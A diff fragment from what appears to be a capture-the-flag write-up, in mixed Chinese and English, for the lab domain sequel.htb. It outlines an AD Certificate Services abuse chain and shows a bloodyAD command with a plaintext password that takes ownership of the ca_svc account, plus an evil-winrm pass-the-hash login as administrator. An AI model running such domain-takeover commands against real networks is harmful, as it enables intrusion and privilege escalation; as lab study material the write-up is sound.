@@ -238,6 +238,19 @@ krbtgt                   michael                  oscar
 rose                     ryan                     sql_svc
 The command completed with one or more errors.
 ```
+
+Exploits:
+```
+这些步骤的最终目的是利用配置不当的 AD Certificate Services 和服务账户权限：
+
+修改对象所有权，控制服务账户。
+查找可滥用的证书模板。
+请求伪造的证书，以管理员身份进行操作。
+
+By checking the other users in this machine, we found the special one ca_svc, ca_svc 通常是一个与证书颁发机构（Certificate Authority, CA）相关的服务帐户。这个帐户通常用于支持域中的公钥基础设施（PKI）服务
+If we can control this user, we can create administrator hashes and certificates for ourselves.
+```
+
 将用户 ryan 设置为用户 ca_svc 的所有者
 `bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan`
 为用户 ryan 添加对目标 ca_svc 对象的完全控制权限
@@ -278,3 +291,4 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```
 That means we can use evil-winrm to get the Administrator shell
 `evil-winrm -i dc01.sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff `
+
